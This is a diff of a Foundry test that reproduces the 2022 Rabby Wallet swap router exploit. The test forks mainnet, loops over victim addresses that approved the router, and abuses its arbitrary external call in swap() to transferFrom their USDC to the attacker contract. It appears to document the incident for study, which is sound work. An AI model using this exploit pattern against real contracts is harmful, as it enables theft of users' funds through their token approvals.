@@ -5,8 +5,6 @@ import "forge-std/Test.sol";
 import "./interface.sol";
 
 // @KeyInfo - Total Lost : ~200,000 US$
-// Root cause : Classic arbitrary external call vulnerability
-// Multiple tokens has been stolen, and 114 ETH deposited to Tornado Cash
 // Attacker : 0xb687550842a24d7fbc6aad238fd7e0687ed59d55
 // Attack Contract : 0x9682f31b3f572988f93c2b8382586ca26a866475
 // Vulnerable Contract : 0x6eb211caf6d304a76efe37d9abdfaddc2d4363d1 and these: https://twitter.com/Rabby_io/status/1579833969566449666
@@ -32,32 +30,34 @@ import "./interface.sol";
 //      0x6899b8caee16dbd75359cabcd24e32b2362c474cdf39ea810cf4386018761beb
 //      0x07887fffc4488354d813fdcca5da0586dd6f9a3da36d503af768302eacbeec41
 // Reproduce Tx: Steal USDC - 0x914c1ae4f03657064f0b1d5ddc6e06f39e82bce6fb2f726efdca52c092fbfc26
-//
+
 // @Analysis
-// Supremacy Inc. : https://twitter.com/Supremacy_CA/status/1579813933669486592
-// SlowMist : https://twitter.com/SlowMist_Team/status/1579839744128978945
-// Beosin Alert : https://twitter.com/BeosinAlert/status/1579856733178331139
+// Twitter Supremacy : https://twitter.com/Supremacy_CA/status/1579813933669486592
+// Twitter SlowMist : https://twitter.com/SlowMist_Team/status/1579839744128978945
+// Twitter Beosin Alert : https://twitter.com/BeosinAlert/status/1579856733178331139
 
-CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-address constant attacker = 0xb687550842a24D7FBC6Aad238fd7E0687eD59d55;
-address constant RabbySwapRouter = 0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1;
-address constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
-address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+// Root cause : Classic arbitrary external call vulnerability
+// Multiple tokens has been stolen, and 114 ETH deposited to Tornado Cash
 
-contract Attacker is Test {
+contract ContractTest is Test {
+    IRabbySwap constant RABBYSWAP_ROUTER = IRabbySwap(0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1);
+    IUSDT constant USDT_TOKEN = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    IUSDC constant USDC_TOKEN = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+
     function setUp() public {
-        cheat.createSelectFork("mainnet", 15_724_451);
-        cheat.label(attacker, "attacker");
-        cheat.label(RabbySwapRouter, "RabbySwapRouter");
-        cheat.label(usdt, "USDT");
-        cheat.label(usdc, "USDC");
+        vm.createSelectFork("mainnet", 15_724_451);
+        vm.label(address(RABBYSWAP_ROUTER), "RABBYSWAP_ROUTER");
+        vm.label(address(USDT_TOKEN), "USDT_TOKEN");
+        vm.label(address(USDC_TOKEN), "USDC_TOKEN");
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("[Before] Attacker's USDC Balance:", IERC20(usdc).balanceOf(address(this)), 6);
+        emit log_named_decimal_uint(
+            "[Start] Attacker USDC balance before exploit", USDC_TOKEN.balanceOf(address(this)), 6
+        );
 
-        // Somehow attacker got these EOA addresses that are approved the Rabby Wallet Swap Router contract.
-        // ...Maybe the attacker grep the history Txs and find those victims that interacted with the Swap Router contract.
+        // Somehow attacker got these EOA addresses that approved the Rabby Wallet Swap Router contract.
+        // ...Maybe the attacker grepped the history Txs and found those victims that interacted with the Swap Router contract.
         address[29] memory victims = [
             0x94228872bb16CBCDfe010c42a8e456d15B366bF1,
             0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB,
@@ -91,37 +91,46 @@ contract Attacker is Test {
         ];
 
         for (uint256 i; i < victims.length; ++i) {
-            // Step1: Check the victim allowance
-            uint256 vic_balance = IERC20(usdc).balanceOf(victims[i]);
-            uint256 vic_allowance = IERC20(usdc).allowance(victims[i], RabbySwapRouter);
+            // Step 1: Check the victim's USDC balance and allowance to RABBYSWAP_ROUTER
+            uint256 vic_balance = USDC_TOKEN.balanceOf(victims[i]);
+            uint256 vic_allowance = USDC_TOKEN.allowance(victims[i], address(RABBYSWAP_ROUTER));
 
-            // Step2: If allowance >= balance: exploit!
+            // Step 2: If allowance >= balance: exploit!
             if (vic_allowance >= vic_balance) {
                 // Classic arbitrary external calls `swap()` vulnerability, and the parameter `address dexRouter` is controllable.
                 bytes memory usdc_callbackData = abi.encodeWithSignature(
                     "transferFrom(address,address,uint256)", victims[i], address(this), vic_balance
                 );
-                IRabbySwap(RabbySwapRouter).swap(
-                    usdt, 0, address(this), 4660, usdc, usdc, usdc_callbackData, block.timestamp
+                RABBYSWAP_ROUTER.swap(
+                    address(USDT_TOKEN),
+                    0,
+                    address(this),
+                    4660,
+                    address(USDC_TOKEN),
+                    address(USDC_TOKEN),
+                    usdc_callbackData,
+                    block.timestamp
                 );
             }
         }
 
-        emit log_named_decimal_uint("[After] Attacker's USDC Balance:", IERC20(usdc).balanceOf(address(this)), 6);
+        emit log_named_decimal_uint(
+            "[End] Attacker USDC balance before exploit", USDC_TOKEN.balanceOf(address(this)), 6
+        );
     }
 
-    function balanceOf(address) external view returns (uint256) {
+    function balanceOf(address) external pure returns (uint256) {
         return 100e18;
     }
 
-    function transfer(address, uint256) external view returns (bool) {
+    function transfer(address, uint256) external pure returns (bool) {
         return true;
     }
 
     receive() external payable {}
 }
 
-/* -------------------- Interface -------------------- */
+/* -------------------- RabbySwap Interface -------------------- */
 interface IRabbySwap {
     function swap(
         address srcToken,
